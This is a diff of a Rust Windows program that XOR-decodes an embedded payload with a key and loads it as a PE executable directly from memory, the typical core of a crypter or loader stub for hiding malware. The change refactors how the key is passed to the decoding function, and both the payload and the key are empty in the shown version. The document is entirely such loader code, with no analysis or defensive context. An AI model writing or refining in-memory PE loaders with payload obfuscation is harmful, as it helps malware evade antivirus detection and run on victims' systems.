@@ -100,9 +100,9 @@ const IMAGE_DIRECTORY_ENTRY_BASERELOC: usize = 5;
 const IMAGE_DIRECTORY_ENTRY_TLS: usize = 9;
 
 #[cfg(windows)]
-const PAYLOAD: &[u8] = &[];
+const SECRET_KEY: &[u8] = &[];
 #[cfg(windows)]
-const SECRET_KEY: &[u8] = b"change-this-secret-key-to-something-unique";
+const PAYLOAD: &[u8] = &[];
 
 #[cfg(windows)]
 unsafe fn get_data_directory(nt_headers: *const ImageNtHeaders64, index: usize) -> *const ImageDataDirectory {
@@ -322,11 +322,11 @@ unsafe fn load_pe_from_memory(pe_data: &[u8]) -> Result<(), String> {
 }
 
 #[cfg(windows)]
-fn transform_data(data: &[u8]) -> Vec<u8> {
-    if SECRET_KEY.is_empty() {
+fn transform_data(data: &[u8], key: &[u8]) -> Vec<u8> {
+    if key.is_empty() {
         return data.to_vec();
     }
-    data.iter().enumerate().map(|(i, byte)| byte ^ SECRET_KEY[i % SECRET_KEY.len()]).collect()
+    data.iter().enumerate().map(|(i, byte)| byte ^ key[i % key.len()]).collect()
 }
 
 fn main() {
@@ -337,7 +337,7 @@ fn main() {
             return;
         }
 
-        let decoded_payload = transform_data(PAYLOAD);
+        let decoded_payload = transform_data(PAYLOAD, SECRET_KEY);
 
         unsafe {
             if let Err(e) = load_pe_from_memory(&decoded_payload) {
